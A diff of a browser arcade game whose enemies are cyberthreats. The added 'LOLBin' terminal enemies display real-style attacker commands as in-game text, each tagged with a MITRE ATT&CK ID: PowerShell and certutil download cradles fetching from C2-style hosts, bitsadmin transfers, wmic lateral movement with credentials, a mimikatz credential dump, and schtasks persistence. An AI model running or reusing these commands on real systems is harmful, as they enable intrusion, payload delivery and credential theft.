-        CX.beginPath(); CX.moveTo(0,-17); CX.lineTo(14,2); CX.lineTo(11,15);
-        CX.lineTo(0,11); CX.lineTo(-11,15); CX.lineTo(-14,2); CX.closePath(); CX.fill();
-        CX.strokeStyle='#e090ff'; CX.lineWidth=2; CX.beginPath(); CX.ellipse(0,0,17,20,0,0,TAU); CX.stroke();
-        CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('⚡',0,3); break;
+      case 'cryptoJet': {
+        // Cryptocurrency mining jet: sleek fighter with GPU fin arrays + ₿
+        CX.fillStyle=fc||'#007799';
+        // Fuselage
+        CX.beginPath(); CX.moveTo(0,-17); CX.lineTo(10,0); CX.lineTo(8,13);
+        CX.lineTo(0,9); CX.lineTo(-8,13); CX.lineTo(-10,0); CX.closePath(); CX.fill();
+        // GPU cooling fins on wings
+        CX.strokeStyle=fc||'#22ddcc'; CX.lineWidth=1;
+        for(const fx of [-12,-9,-15]){
+          CX.beginPath(); CX.moveTo(fx,-2); CX.lineTo(fx+1,8); CX.stroke();
+        }
+        for(const fx of [12,9,15]){
+          CX.beginPath(); CX.moveTo(fx,-2); CX.lineTo(fx-1,8); CX.stroke();
+        }
+        // Engine glow
+        const eGlow=0.5+0.4*Math.sin(e.t*5);
+        CX.fillStyle=`rgba(40,240,220,${eGlow*0.4})`;
+        CX.beginPath(); CX.ellipse(0,9,4,3,0,0,TAU); CX.fill();
+        // ₿ marking
+        CX.fillStyle='#aafff0'; CX.font='bold 8px monospace'; CX.textAlign='center';
+        CX.fillText('₿',0,2); break;
+      }
 
-      // ── Standard river threats ────────────────────────────────────
-      case 'skiff':
-        CX.fillStyle=fc||'#52dbff';
-        CX.beginPath(); CX.moveTo(-15,6); CX.lineTo(-6,-8); CX.lineTo(9,-8); CX.lineTo(15,6); CX.closePath(); CX.fill();
-        CX.fillStyle='#0a1b26'; CX.fillRect(-5,-5,10,7); break;
+      case 'wiperJet': {
+        // Wiper malware bomber — dark destroyer with erasure animation
+        CX.fillStyle=fc||'#880088';
+        // Wide delta wing shape
+        CX.beginPath(); CX.moveTo(0,-18); CX.lineTo(15,3); CX.lineTo(12,16);
+        CX.lineTo(0,12); CX.lineTo(-12,16); CX.lineTo(-15,3); CX.closePath(); CX.fill();
+        CX.strokeStyle=fc||'#cc44cc'; CX.lineWidth=1.2;
+        CX.beginPath(); CX.moveTo(0,-18); CX.lineTo(15,3); CX.lineTo(-15,3); CX.closePath(); CX.stroke();
+        // Animated wipe stripes (erasure effect using e.t)
+        const wipePhase=(e.t*1.8)%2;
+        const wipeX=-14+wipePhase*16;
+        CX.fillStyle='rgba(255,50,255,0.55)';
+        CX.fillRect(wipeX,-4,4,8);
+        CX.fillStyle='rgba(150,0,200,0.3)';
+        CX.fillRect(wipeX-8,-4,8,8);
+        // ⊘ destruction symbol
+        CX.strokeStyle=fc||'#ffaaff'; CX.lineWidth=1.8;
+        CX.beginPath(); CX.arc(0,0,5,0,TAU); CX.stroke();
+        CX.beginPath(); CX.moveTo(-3.5,-3.5); CX.lineTo(3.5,3.5); CX.stroke(); break;
+      }
 
-      case 'idSkiff':
-        CX.fillStyle=fc||'#ff62ff';
-        CX.beginPath(); CX.moveTo(-14,6); CX.lineTo(-6,-8); CX.lineTo(8,-8); CX.lineTo(14,6); CX.closePath(); CX.fill();
-        CX.fillStyle='#2a0030'; CX.fillRect(-4,-4,8,7);
-        CX.fillStyle='#ffc8ff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('ID',0,2); break;
+      // ── River threats — cinematic redesign ───────────────────────
+      case 'skiff': {
+        // Fast attack speedboat: sharp V-bow, angular hull, wake chevrons
+        CX.fillStyle=fc||'#2a8faa';
+        // Hull — pointed bow (top = forward)
+        CX.beginPath(); CX.moveTo(0,-8); CX.lineTo(14,7); CX.lineTo(10,8);
+        CX.lineTo(-10,8); CX.lineTo(-14,7); CX.closePath(); CX.fill();
+        // Deck panels
+        CX.fillStyle=fc||'#3aafcc'; CX.fillRect(-8,-2,16,5);
+        // Cockpit cabin
+        CX.fillStyle='#0a1b26'; CX.fillRect(-4,-4,8,6);
+        CX.fillStyle='rgba(80,200,230,0.5)'; CX.fillRect(-3,-3,6,4); // windshield tint
+        // Radar dish antenna (small)
+        if(vis){ CX.strokeStyle='#42d9ff'; CX.lineWidth=0.8;
+          CX.beginPath(); CX.arc(0,-5,3,Math.PI*1.2,Math.PI*1.8); CX.stroke(); }
+        // Wake chevrons behind boat
+        CX.strokeStyle='rgba(80,200,230,0.3)'; CX.lineWidth=1;
+        CX.beginPath(); CX.moveTo(-9,8); CX.lineTo(0,11); CX.lineTo(9,8); CX.stroke();
+        CX.beginPath(); CX.moveTo(-6,12); CX.lineTo(0,14); CX.lineTo(6,12); CX.stroke(); break;
+      }
 
-      case 'tokenSkiff':
-        CX.fillStyle=fc||'#ffd84d';
-        CX.beginPath(); CX.moveTo(-15,6); CX.lineTo(-6,-8); CX.lineTo(9,-8); CX.lineTo(15,6); CX.closePath(); CX.fill();
-        CX.fillStyle='#2a2000'; CX.fillRect(-4,-4,8,7);
-        CX.fillStyle='#fff1a6'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('TK',0,2); break;
+      case 'idSkiff': {
+        // Identity theft vessel: skiff hull + fake ID card overlay
+        CX.fillStyle=fc||'#aa2288';
+        CX.beginPath(); CX.moveTo(0,-8); CX.lineTo(13,7); CX.lineTo(9,8);
+        CX.lineTo(-9,8); CX.lineTo(-13,7); CX.closePath(); CX.fill();
+        // Fake ID card strapped to deck
+        CX.fillStyle=fc||'#330033'; CX.fillRect(-6,-3,12,7);
+        CX.strokeStyle=fc||'#ff88ff'; CX.lineWidth=0.8; CX.strokeRect(-6,-3,12,7);
+        // Holographic stripe
+        CX.fillStyle='rgba(255,100,255,0.35)'; CX.fillRect(-6,-3,12,2);
+        CX.fillStyle='#ffc8ff'; CX.font='bold 6px monospace'; CX.textAlign='center';
+        CX.fillText('ID',0,3);
+        // Wake
+        CX.strokeStyle='rgba(200,80,200,0.25)'; CX.lineWidth=1;
+        CX.beginPath(); CX.moveTo(-8,8); CX.lineTo(0,11); CX.lineTo(8,8); CX.stroke(); break;
+      }
 
-      case 'runnerBoat':
-        CX.fillStyle=fc||'#74ff88';
-        CX.beginPath(); CX.moveTo(-18,7); CX.lineTo(0,-10); CX.lineTo(18,7); CX.closePath(); CX.fill();
-        CX.fillStyle='#0f2614'; CX.fillRect(-5,-4,10,8);
-        CX.fillStyle='#caffb2'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('EX',0,2); break;
+      case 'tokenSkiff': {
+        // Token carrier: boat hull + glowing gold cargo hold
+        CX.fillStyle=fc||'#8a6200';
+        CX.beginPath(); CX.moveTo(0,-8); CX.lineTo(14,7); CX.lineTo(10,8);
+        CX.lineTo(-10,8); CX.lineTo(-14,7); CX.closePath(); CX.fill();
+        // Gold cargo hold — glowing
+        const glow=0.6+0.4*Math.sin(e.t*3);
+        CX.shadowBlur=vis?8*glow:0; CX.shadowColor='#ffd84d';
+        CX.fillStyle=fc||'#665000'; CX.fillRect(-8,-1,16,7);
+        CX.fillStyle=`rgba(255,220,80,${0.6*glow})`; CX.fillRect(-7,0,14,5); // cargo glow
+        CX.shadowBlur=0;
+        // Token label
+        CX.fillStyle='#ffe880'; CX.font='bold 6px monospace'; CX.textAlign='center';
+        CX.fillText('TK',0,4);
+        CX.strokeStyle='rgba(255,216,77,0.4)'; CX.lineWidth=1;
+        CX.beginPath(); CX.moveTo(-9,8); CX.lineTo(0,11); CX.lineTo(9,8); CX.stroke(); break;
+      }
 
-      case 'poisonBarge':
-        CX.fillStyle=fc||'#88ff55';
-        CX.fillRect(-31,-12,62,23); CX.fillRect(-22,-19,44,9);
-        CX.fillStyle='#1a3808'; CX.fillRect(-25,-7,50,14);
-        CX.fillStyle='#aaffaa'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('SUPPLY',0,3);
-        CX.fillStyle='rgba(200,255,120,0.42)';
-        CX.beginPath(); CX.arc(-16,0,4,0,TAU); CX.fill();
-        CX.beginPath(); CX.arc(16,0,4,0,TAU);  CX.fill(); break;
+      case 'runnerBoat': {
+        // Data exfiltration runner: lowest-profile, fastest-looking, data pod at stern
+        CX.fillStyle=fc||'#1a6620';
+        // Ultra-low aerodynamic hull
+        CX.beginPath(); CX.moveTo(0,-9); CX.lineTo(16,6); CX.lineTo(12,8);
+        CX.lineTo(-12,8); CX.lineTo(-16,6); CX.closePath(); CX.fill();
+        // Speed lines (length proportional to speed)
+        CX.strokeStyle='rgba(120,255,140,0.35)'; CX.lineWidth=1;
+        for(const slx of [-6,0,6]){
+          CX.beginPath(); CX.moveTo(slx,9); CX.lineTo(slx,15); CX.stroke();
+        }
+        // Exfil data pod at stern (glowing)
+        CX.fillStyle=fc||'#003a08'; CX.fillRect(-6,1,12,6);
+        const dpGlow=0.55+0.3*Math.sin(e.t*4);
+        CX.fillStyle=`rgba(116,255,136,${dpGlow})`; CX.fillRect(-5,2,10,4);
+        CX.fillStyle='#caffb2'; CX.font='bold 5px monospace'; CX.textAlign='center';
+        CX.fillText('EX',0,5); break;
+      }
 
-      case 'armoredBarge':
-        CX.fillStyle=fc||'#ff5a4d';
-        CX.fillRect(-33,-12,66,24); CX.fillRect(-23,-20,46,9);
-        CX.fillStyle='#6e1a18'; CX.fillRect(-27,-8,54,16);
-        CX.strokeStyle='#ffd84d'; CX.lineWidth=2; CX.strokeRect(-9,-11,18,22);
-        CX.fillStyle='#ffd84d'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('RANSOM',0,3); break;
+      case 'poisonBarge': {
+        // Chemical supply barge: industrial hull + 3 toxic drums + skull + bubble drips
+        // Hull
+        CX.fillStyle=fc||'#2a5010'; CX.fillRect(-31,-12,62,22);
+        // Superstructure
+        CX.fillStyle=fc||'#3a6a1a'; CX.fillRect(-20,-20,40,10);
+        // Hull rivets
+        if(vis){
+          CX.fillStyle='#5a8a2a';
+          for(const rx of [-28,-24,-20,20,24,28]){CX.beginPath();CX.arc(rx,4,1.2,0,TAU);CX.fill();}
+        }
+        // 3 toxic barrel drums
+        [[-16,0],[0,0],[16,0]].forEach(([dx,dy])=>{
+          CX.fillStyle=fc||'#1a4408'; CX.fillRect(dx-5,dy-8,10,14);
+          CX.strokeStyle=fc||'#88ff55'; CX.lineWidth=0.8; CX.strokeRect(dx-5,dy-8,10,14);
+          // Toxic liquid fill
+          const txFill=0.4+0.3*Math.sin(e.t*1.5+dx);
+          CX.fillStyle=`rgba(120,255,60,${txFill})`; CX.fillRect(dx-4,dy,8,5);
+          // Drum bands
+          CX.strokeStyle='rgba(160,255,80,0.35)'; CX.lineWidth=0.6;
+          CX.beginPath(); CX.moveTo(dx-5,dy-3); CX.lineTo(dx+5,dy-3); CX.stroke();
+        });
+        // Skull and crossbones (center)
+        CX.fillStyle='rgba(200,255,80,0.6)'; CX.font='10px monospace'; CX.textAlign='center';
+        CX.fillText('☠',0,-4);
+        // Toxic bubble drips below hull
+        if(vis){
+          for(let bi=0;bi<4;bi++){
+            const bx=-24+bi*16; const by=10+((e.t*2+bi*0.7)%1)*8;
+            CX.fillStyle=`rgba(140,255,70,${0.3-by*0.02})`;
+            CX.beginPath(); CX.arc(bx,by,1.5,0,TAU); CX.fill();
+          }
+        }
+        // Biohazard ring
+        CX.strokeStyle=vis?'rgba(160,255,80,0.3)':'rgba(80,140,40,0.15)'; CX.lineWidth=0.7;
+        CX.beginPath(); CX.arc(0,-16,12,0,TAU); CX.stroke(); break;
+      }
+
+      case 'armoredBarge': {
+        // Ransomware battleship: heavy armored plating + turret + padlock + rivets
+        // Main armored hull (dark steel)
+        CX.fillStyle=fc||'#5a1010';
+        CX.fillRect(-33,-12,66,24);
+        // Armor plating — raised panel
+        CX.fillStyle=fc||'#3a0808'; CX.fillRect(-27,-8,54,16);
+        // Steel plate texture (dark panels)
+        if(vis){
+          CX.fillStyle='rgba(180,40,40,0.2)';
+          [[-22,-8],[-10,-8],[2,-8],[14,-8]].forEach(([px,py])=>CX.fillRect(px,py,10,7));
+          [[-22,1],[-10,1],[2,1],[14,1]].forEach(([px,py])=>CX.fillRect(px,py,10,7));
+          // Rivet marks
+          CX.fillStyle='rgba(200,60,60,0.4)';
+          for(const rx of [-30,-20,-10,0,10,20,30]){
+            CX.beginPath(); CX.arc(rx,-11,1.2,0,TAU); CX.fill();
+            CX.beginPath(); CX.arc(rx,11,1.2,0,TAU); CX.fill();
+          }
+        }
+        // Superstructure/bridge
+        CX.fillStyle=fc||'#881818'; CX.fillRect(-18,-20,36,9);
+        CX.strokeStyle=fc||'#ff5a4d'; CX.lineWidth=1; CX.strokeRect(-18,-20,36,9);
+        // Deck turret
+        CX.fillStyle=fc||'#cc2222';
+        CX.beginPath(); CX.arc(0,-8,5,0,TAU); CX.fill();
+        CX.strokeStyle='#ff8888'; CX.lineWidth=1; CX.stroke();
+        CX.fillStyle='#660000'; CX.fillRect(-1,-15,2,8); // gun barrel
+        // Prominent padlock (ransomware demand)
+        const lkPulse=0.8+0.2*Math.sin(e.t*4);
+        CX.shadowBlur=vis?10*lkPulse:0; CX.shadowColor='#ffd84d';
+        CX.fillStyle=fc||'#cc9900';
+        CX.fillRect(-5,0,10,8); CX.strokeStyle='#ffd84d'; CX.lineWidth=1.2; CX.strokeRect(-5,0,10,8);
+        // Shackle
+        CX.beginPath(); CX.arc(0,0,4,Math.PI,0); CX.stroke();
+        CX.shadowBlur=0;
+        CX.fillStyle='#ffd84d'; CX.font='bold 5px monospace'; CX.textAlign='center';
+        CX.fillText('RANSOM',0,8); break;
+      }
 
       case 'mine': {
+        // Naval mine: sphere body + 8 horned spikes + pulsing proximity ring + fuse
         const md=Math.hypot(e.x-PL.x,sy-PL.y);
         const mFlash=md<140&&Math.floor(Date.now()/140)%2===0;
-        CX.fillStyle=fc||(mFlash?'#ffffff':'#ff7a00');
-        CX.shadowBlur=mFlash?14:0; CX.shadowColor='#ff7a00';
+        // Proximity pulse ring (expands outward)
+        if(md<180&&vis){
+          const ringPh=(Date.now()*0.002)%1;
+          CX.strokeStyle=`rgba(255,120,0,${0.4*(1-ringPh)})`; CX.lineWidth=1;
+          CX.beginPath(); CX.arc(0,0,14+ringPh*60,0,TAU); CX.stroke();
+        }
+        // Main body
+        CX.shadowBlur=mFlash?18:0; CX.shadowColor='#ff7a00';
+        CX.fillStyle=fc||(mFlash?'#ffffff':'#2a1200');
         CX.beginPath(); CX.arc(0,0,9,0,TAU); CX.fill();
-        for(let j=0;j<6;j++){
-          const a=j/6*TAU; CX.strokeStyle='#ffd84d'; CX.lineWidth=2;
+        // Sphere highlight
+        if(!fc){
+          CX.fillStyle='rgba(255,120,40,0.25)';
+          CX.beginPath(); CX.arc(-2,-2,5,0,TAU); CX.fill();
+        }
+        // 8 contact horns (spikes)
+        for(let j=0;j<8;j++){
+          const a=j/8*TAU; CX.strokeStyle=fc||'#cc4400'; CX.lineWidth=1.8;
           CX.beginPath(); CX.moveTo(Math.cos(a)*9,Math.sin(a)*9);
           CX.lineTo(Math.cos(a)*15,Math.sin(a)*15); CX.stroke();
+          // Horn tip detonator ball
+          CX.fillStyle=fc||(mFlash?'#fff':'#ff6600');
+          CX.beginPath(); CX.arc(Math.cos(a)*16,Math.sin(a)*16,1.8,0,TAU); CX.fill();
         }
+        // Top fuse detonator
+        CX.fillStyle=fc||'#ff4400'; CX.fillRect(-1,-11,2,3);
+        CX.beginPath(); CX.arc(0,-13,2,0,TAU); CX.fill();
         CX.shadowBlur=0; break;
       }
 
-      // ── LOLBin terminal windows ───────────────────────────────────
-      case 'lolBin':
-        drawTerminalWindow(e,sy,'cmd.exe','C:\\> ','#cccccc','#1a1a1a','#cccccc',vis?'> exec payload':''); break;
+      // ── LOLBin terminals — drawTerminalV2() with real-attack content ─
+      // ARCH: Each LOLBin uses documented adversary TTPs as command content.
+      // Lines starting with '>' are rendered in cmdCol (prompt/command color).
+      // Lines without '>' are rendered in outCol (output/response color).
+      // Refs: MITRE ATT&CK T1059.001, T1047, T1197, T1218, T1053 etc.
 
-      case 'powershell':
-        drawTerminalWindow(e,sy,'Windows PowerShell','PS C:\\> ','#aaaaff','#012456','#aaaaff',vis?'IEX(Net-Web...)':'');
-        if(vis){
+      case 'lolBin':
+        // Generic cmd.exe — living-off-the-land encoded payload (T1059.003)
+        drawTerminalV2(e,{
+          bg:'#0c0c0c', titleBg:'#1a1a1a', title:'cmd.exe',
+          border:'#888888', cmdCol:'#cccccc', outCol:'rgba(180,180,180,0.65)',
+          lines:[
+            '>C:\\> cmd /c powershell',
+            '>-WindowStyle Hidden',
+            '>-enc SQBFAFgAKABOAGUA',
+            'Bypass: ACTIVE',
+            'PID: 3841 [RUNNING]',
+          ]
+        }); break;
+
+      case 'powershell': {
+        // FANCY BEAR / COZY BEAR PowerShell download cradle (T1059.001 + T1562.001)
+        const psVis=canSeeE(e);
+        drawTerminalV2(e,{
+          bg:'#012456', titleBg:'#001840', title:'Windows PowerShell 5.1',
+          border:'#4488ff', cmdCol:'#aaaaff', outCol:'rgba(160,160,220,0.6)',
+          lines:[
+            '>PS> $wc=New-Object',
+            '>  Net.WebClient',
+            '>$wc.DownloadString',
+            '>  (\'http://c2/p.ps1\')',
+            'AMSI: BYPASSED ✓',
+            '>IEX $payload',
+          ]
+        });
+        // HP integrity bar above window
+        if(psVis){
           CX.globalAlpha=1;
-          CX.fillStyle='#001133'; CX.fillRect(-e.w/2,-e.h/2-10,e.w,6);
+          CX.fillStyle='#001133'; CX.fillRect(-e.w/2,-e.h/2-8,e.w,5);
           CX.fillStyle=e.hp/e.maxHp>0.5?'#4488ff':'#ff5a4d';
-          CX.fillRect(-e.w/2,-e.h/2-10,e.w*(e.hp/e.maxHp),6);
-          CX.strokeStyle='#012456'; CX.lineWidth=1; CX.strokeRect(-e.w/2,-e.h/2-10,e.w,6);
+          CX.fillRect(-e.w/2,-e.h/2-8,e.w*(e.hp/e.maxHp),5);
+          CX.strokeStyle='#012456'; CX.lineWidth=0.8; CX.strokeRect(-e.w/2,-e.h/2-8,e.w,5);
         }
         break;
+      }
 
       case 'wmiExec':
-        drawTerminalWindow(e,sy,'WMI','wmic /node:','#ff8888','#5c1a1a','#ff8888',vis?'process call create':''); break;
+        // APT lateral movement via WMI (T1047) — used by PANDA actors
+        drawTerminalV2(e,{
+          bg:'#1a0a0a', titleBg:'#3a1010', title:'WMI Console',
+          border:'#ff5555', cmdCol:'#ff8888', outCol:'rgba(220,140,140,0.6)',
+          lines:[
+            '>wmic /node:10.2.1.44',
+            '>/user:CORP\\admin',
+            '>/pass:P@ssw0rd!',
+            '>process call create',
+            '>  "cmd.exe /c whoami"',
+            'PID 4832: SUCCESS',
+          ]
+        }); break;
 
-      case 'bitsAdmin':
-        drawTerminalWindow(e,sy,'BITSAdmin','bitsadmin /','#8ab4cc','#1e3040','#8ab4cc',vis?'/transfer job http://':'');
-        if(vis){
-          CX.globalAlpha=0.7;
-          const prog=(Math.sin(e.t*1.4)+1)*0.5;
-          CX.fillStyle='#112233'; CX.fillRect(-e.w/2+2,e.h/2-4,e.w-4,3);
-          CX.fillStyle='#4ab6ff'; CX.fillRect(-e.w/2+2,e.h/2-4,(e.w-4)*prog,3);
+      case 'bitsAdmin': {
+        // BITS-based C2 download (T1197) — TA505, FIN7 documented technique
+        const bVis=canSeeE(e);
+        drawTerminalV2(e,{
+          bg:'#0d1a2a', titleBg:'#1a2e40', title:'BITSAdmin v3.0',
+          border:'#4ab6ff', cmdCol:'#8ab4cc', outCol:'rgba(130,170,200,0.6)',
+          lines:[
+            '>bitsadmin /transfer',
+            '>"SysUpdate"',
+            '>http://185.220.x/svc',
+            '>C:\\Windows\\Temp\\',
+            '>svchost.exe',
+          ]
+        });
+        // Animated download progress bar (below window)
+        if(bVis){
+          const prog=(Math.sin(e.t*1.2)+1)*0.5;
+          const barY=e.h/2+2;
+          CX.globalAlpha=0.85;
+          CX.fillStyle='#0d1a2a'; CX.fillRect(-e.w/2,barY,e.w,5);
+          CX.fillStyle='#4ab6ff'; CX.fillRect(-e.w/2,barY,e.w*prog,5);
+          CX.strokeStyle='#1a2e40'; CX.lineWidth=0.8; CX.strokeRect(-e.w/2,barY,e.w,5);
+          CX.fillStyle='#8ab4cc'; CX.font='5px monospace'; CX.textAlign='center';
+          CX.fillText(Math.round(prog*100)+'%',0,barY+4);
         }
         break;
+      }
 
-      case 'eventvwr':
-        if(vis&&e.cloneFlash>0){
-          CX.globalAlpha=e.cloneFlash*0.5; CX.fillStyle='#00ff88';
-          CX.fillRect(-e.w/2+12,-e.h/2+6,e.w,e.h);
-          CX.globalAlpha=vis?1:(0.08+0.06*Math.sin(Date.now()*0.004+e.x*0.05));
+      case 'eventvwr': {
+        // UAC bypass via eventvwr + LSASS dump — mimikatz (T1548.002 + T1003.001)
+        const evVis=canSeeE(e);
+        if(evVis&&e.cloneFlash>0){
+          CX.save();
+          CX.globalAlpha=e.cloneFlash*0.45; CX.fillStyle='#00ff88';
+          CX.fillRect(-e.w/2+10,-e.h/2+8,e.w,e.h); // clone ghost offset
+          CX.restore();
+          CX.globalAlpha=evVis?1:(0.06+0.07*Math.sin(Date.now()*0.004+e.x*0.05));
         }
-        drawTerminalWindow(e,sy,'VMware Console','vmrun clone','#88ffcc','#0a2a1a','#88ffcc',vis?'snapshot: LSASS':''); break;
+        drawTerminalV2(e,{
+          bg:'#071a0e', titleBg:'#0f2e1a', title:'mimikatz 2.2.0',
+          border:'#00cc66', cmdCol:'#88ffcc', outCol:'rgba(100,200,150,0.6)',
+          lines:[
+            '>sekurlsa::logon',
+            '>  passwords',
+            'Authentication Id:',
+            '  0;999312 (SYSTEM)',
+            'NTLM: f0e3b6c92...',
+            '[12 hashes dumped]',
+          ]
+        }); break;
+      }
 
       case 'certUtil':
-        drawTerminalWindow(e,sy,'certutil.exe','certutil -d ','#80cc80','#0d260d','#80cc80',vis?'-decode payload.b64':''); break;
+        // certutil decode + download (T1140 + T1105) — BRONZE UNION / WICKED PANDA
+        drawTerminalV2(e,{
+          bg:'#0d200d', titleBg:'#1a3a1a', title:'certutil.exe',
+          border:'#55bb55', cmdCol:'#80cc80', outCol:'rgba(120,190,120,0.6)',
+          lines:[
+            '>certutil -urlcache',
+            '>-split -f',
+            '>http://c2.ru/p.b64',
+            '>payload.b64',
+            'CertUtil: OK',
+            '>certutil -decode p',
+          ]
+        }); break;
 
-      case 'rundll32':
-        drawTerminalWindow(e,sy,'rundll32.exe','rundll32 ','#9999ff','#111133','#9999ff',vis?'shell32.dll,#21':'');
-        if(vis){
+      case 'rundll32': {
+        // rundll32 JavaScript stager (T1218.011) — TA505, INDRIK SPIDER
+        const rdVis=canSeeE(e);
+        drawTerminalV2(e,{
+          bg:'#0d0d1a', titleBg:'#1a1a33', title:'rundll32.exe',
+          border:'#7777ff', cmdCol:'#9999ff', outCol:'rgba(150,150,220,0.6)',
+          lines:[
+            '>rundll32.exe js:',
+            '>"\\..\\mshtml,',
+            '>RunHTMLApplication"',
+            '>Shell.Exec(cmd)',
+            '[DLL: HIJACKED]',
+            'module loaded ✓',
+          ]
+        });
+        // HP integrity bar
+        if(rdVis){
           CX.globalAlpha=1;
-          CX.fillStyle='#111133'; CX.fillRect(-e.w/2,-e.h/2-10,e.w,6);
           const rHpCol=e.hp/e.maxHp>0.66?'#8888ff':e.hp/e.maxHp>0.33?'#ffd84d':'#ff5a4d';
-          CX.fillStyle=rHpCol; CX.fillRect(-e.w/2,-e.h/2-10,e.w*(e.hp/e.maxHp),6);
-          CX.strokeStyle='#222255'; CX.lineWidth=1; CX.strokeRect(-e.w/2,-e.h/2-10,e.w,6);
+          CX.fillStyle='#0d0d1a'; CX.fillRect(-e.w/2,-e.h/2-8,e.w,5);
+          CX.fillStyle=rHpCol; CX.fillRect(-e.w/2,-e.h/2-8,e.w*(e.hp/e.maxHp),5);
+          CX.strokeStyle='#222255'; CX.lineWidth=0.8; CX.strokeRect(-e.w/2,-e.h/2-8,e.w,5);
         }
         break;
+      }
 
       case 'schtasks': {
-        // ARCH: block-scoped to avoid const collision with other cases
-        const stTitleCol=e.respawned?'#4a3a00':'#3a3a0a';
-        const stPromptCol=e.respawned?'#ff8800':'#ddcc44';
-        drawTerminalWindow(e,sy,'schtasks.exe','/create /sc ',stPromptCol,stTitleCol,stPromptCol,
-          vis?(e.respawned?'PERSISTED—re-run':'/tr payload.exe'):'');
-        if(e.respawned&&vis){
-          const rp=0.5+0.5*Math.sin(Date.now()*0.016);
-          CX.globalAlpha=rp*0.35; CX.fillStyle='#ff8800';
-          CX.fillRect(-e.w/2,-e.h/2,e.w,e.h); CX.globalAlpha=1;
+        // Scheduled task persistence (T1053.005) — FIN7 / CARBON SPIDER / SCATTERED SPIDER
+        const stCols=e.respawned
+          ? {bg:'#1a0e00',titleBg:'#3a2000',border:'#ff8800',cmdCol:'#ffaa44',outCol:'rgba(220,160,80,0.6)'}
+          : {bg:'#1a1a00',titleBg:'#2e2e00',border:'#ccaa00',cmdCol:'#ddcc44',outCol:'rgba(200,190,100,0.6)'};
+        drawTerminalV2(e,{
+          ...stCols, title:'schtasks.exe',
+          lines:[
+            '>/create /sc ONLOGON',
+            '>  /tn "WinDefUpdate"',
+            '>  /tr "%TEMP%\\p.exe"',
+            e.respawned?'PERSISTED: RE-RUN':'SUCCESS: SCHEDULED',
+            e.respawned?'[3 triggers SET]':'Triggers: 1',
+          ]
+        });
+        if(e.respawned&&canSeeE(e)){
+          const rp=0.35+0.25*Math.sin(Date.now()*0.014);
+          CX.save(); CX.globalAlpha=rp;
+          CX.fillStyle='#ff8800'; CX.fillRect(-e.w/2,-e.h/2,e.w,e.h);
+          CX.restore();
         }
         break;
       }
 
       case 'mshta':
-        drawTerminalWindow(e,sy,'mshta.exe','mshta vbs:','#ff9966','#2a1400','#ff9966',vis?'Execute(payload)':''); break;
+        // mshta HTA stager (T1218.005) — Kimsuky / Lazarus Group documented TTP
+        drawTerminalV2(e,{
+          bg:'#1a0a00', titleBg:'#2e1500', title:'mshta.exe',
+          border:'#ff6633', cmdCol:'#ff9966', outCol:'rgba(220,150,100,0.6)',
+          lines:[
+            '>mshta vbscript:',
+            '>Execute("CreateO',
+            '>bject(WScript.Sh',
+            '>ell).Run(cmd,0)")',
+            '[HIDDEN: RUNNING]',
+          ]
+        }); break;
     }
 
     // HP bar for multi-HP non-terminal enemies
@@ -10202,14 +10957,19 @@ function drawEnemies(){
 }
 
 function drawGround(){
+  const _gt=Date.now()*0.001;
   for(const g of GTERGETS){
     if(!g.alive) continue;
     const sy=w2s(g.wy); if(sy<-100||sy>VH+100) continue;
     const vis=canSeeG(g);
-    CX.save(); CX.translate(g.x,sy); CX.globalAlpha=vis?1:0.11;
+    CX.save(); CX.translate(g.x,sy); CX.globalAlpha=vis?1:0.13;
     const fc=g.hf>0?'#ffffff':null;
-    CX.fillStyle='rgba(0,0,0,0.17)'; CX.beginPath(); CX.ellipse(0,14,g.w*0.44,7,0,0,TAU); CX.fill();
+    // Ground shadow
+    CX.fillStyle='rgba(0,0,0,0.22)'; CX.beginPath(); CX.ellipse(0,g.h*0.28,g.w*0.46,6,0,0,TAU); CX.fill();
+    const hp01=g.hp/g.maxHp;
+
     switch(g.type){
+      // ── fuelDepot kept for backwards compat but no longer spawned ───────
       case 'fuelDepot': {
         const near=Math.hypot(PL.x-g.x,PL.y-sy)<46;
         CX.shadowBlur=near?20:0; CX.shadowColor='#74ff88';
@@ -10219,49 +10979,361 @@ function drawGround(){
         CX.strokeStyle=near?'#74ff88':'#2a5530'; CX.lineWidth=1.8; CX.strokeRect(-16,-13,32,25);
         CX.shadowBlur=0; break;
       }
-      case 'certRelay':
-        CX.fillStyle=fc||'#ff8d39'; CX.fillRect(-4,-21,8,36); CX.fillRect(-15,-3,30,6);
-        CX.strokeStyle='#ffd2ae'; CX.lineWidth=1.5; CX.strokeRect(-11,-20,22,18);
-        CX.fillStyle='#ff8d39'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('CERT',0,-9); break;
-      case 'vishRelay':
-        CX.fillStyle=fc||(!vis?'#74ff88':'#ff62ff'); CX.fillRect(-13,-15,26,29);
-        CX.fillStyle=vis?'#2a0035':'#0a1a10'; CX.fillRect(-9,-11,18,21);
+
+      // ── certRelay — certificate forgery tower ───────────────────────────
+      case 'certRelay': {
+        CX.shadowBlur=vis?8:0; CX.shadowColor='#ff8d39';
+        // Base pillar
+        CX.fillStyle=fc||'#5a2800'; CX.fillRect(-5,-22,10,38);
+        // Crossbeam
+        CX.fillStyle=fc||'#ff8d39'; CX.fillRect(-14,-3,28,6);
+        // Antenna tip
+        CX.fillStyle=fc||'#ffcc88'; CX.fillRect(-2,-32,4,12);
+        // Blinking alert light
+        const blink=Math.sin(_gt*4+g.x)*0.5+0.5;
+        CX.globalAlpha=vis?blink:0.1; CX.fillStyle='#ff4400';
+        CX.beginPath(); CX.arc(0,-33,3,0,TAU); CX.fill();
+        CX.globalAlpha=vis?1:0.13;
+        // Screen display
+        CX.fillStyle='#1a0a00'; CX.fillRect(-11,-20,22,16);
+        CX.fillStyle='#ff8d39'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillText('CERT',0,-10); CX.font='8px monospace'; CX.fillStyle='#ffcc88';
+        CX.fillText(vis?'.EV SIGNED':'.SELF-SIGN',0,-2);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── vishRelay — vishing social-engineering relay ────────────────────
+      case 'vishRelay': {
+        const vc=vis?'#ff62ff':'#446644';
+        CX.shadowBlur=vis?10:0; CX.shadowColor=vc;
+        // Building body
